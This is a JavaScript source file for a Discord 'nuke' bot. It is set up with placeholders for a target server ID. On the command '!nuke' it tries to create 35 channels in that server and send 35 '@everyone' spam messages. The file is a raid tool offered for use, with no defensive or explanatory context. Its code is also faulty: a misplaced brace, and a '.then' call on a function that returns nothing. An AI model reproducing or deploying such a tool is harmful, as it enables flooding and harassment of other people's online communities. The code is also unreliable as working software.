// sefty#001
// MAKE SURE TO CHANGE "CHANNEL_NAME" AND "YOUR MESSAGE"
// CHANGE "SERVER_TO_NUKE_ID" TO SERVER ID

const Discord = require("discord.js")

const { TOKEN } = require("./config.js")

const client = new Discord.Client()

client.on("ready", () => {
    console.log("Bot is online")
})

client.on("message", async message => {
    const msg = message.content.toLowerCase()
    const args = message.content.trim().split(/ +/g);
    const guild = client.guilds.cache.get("SERVER_TO_NUKE_ID");

    if (msg == "!nuke") {
        
        const channelName = "YOUR MESSAGE"
        const messageToSend = "YOUR MESSAGE"
      
        function createChannel(){
            guild.channels
                .create(channelName, {
                    type: "text",
            })
        }
        
        function createChannelLoop() {
            for (let i = 0; i < 35; i++) {
            createChannel()
            }
        }
        
        function sendMessage(){
            message.channel.send(`@everyone ${messageToSend}`)
            }
        }
    
        function sendMessageLoop() {
            for (let i = 0; i < 35; i++) {
            sendMessage()
            }
        }
    
        await createChannelLoop().then(sendMessageLoop())
    
})

client.login(TOKEN)

client.on("debug", () => { })
client.on("warn", () => { })
client.on("error", () => { })
